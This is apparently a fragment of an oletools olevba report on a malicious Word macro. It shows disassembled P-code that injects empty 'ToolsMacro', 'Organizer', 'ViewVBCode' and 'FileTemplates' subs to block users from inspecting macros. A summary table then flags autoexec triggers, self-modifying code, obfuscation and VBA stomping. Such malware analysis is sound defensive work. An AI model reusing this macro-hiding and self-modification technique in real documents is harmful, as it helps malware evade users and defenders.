' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St eol 
' Line #211:
' 	LitStr 0x000E "Sub ToolsMacro"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #212:
' 	LitStr 0x000D "Sub Organizer"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #213:
' 	LitStr 0x000E "Sub ViewVBCode"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #214:
' 	LitStr 0x0011 "Sub FileTemplates"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #215:
' Line #216:
' 	EndIfBlock 
' Line #217:
' 	Label Phuck 
' Line #218:
' 	EndSub 
' Line #219:
' Line #220:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

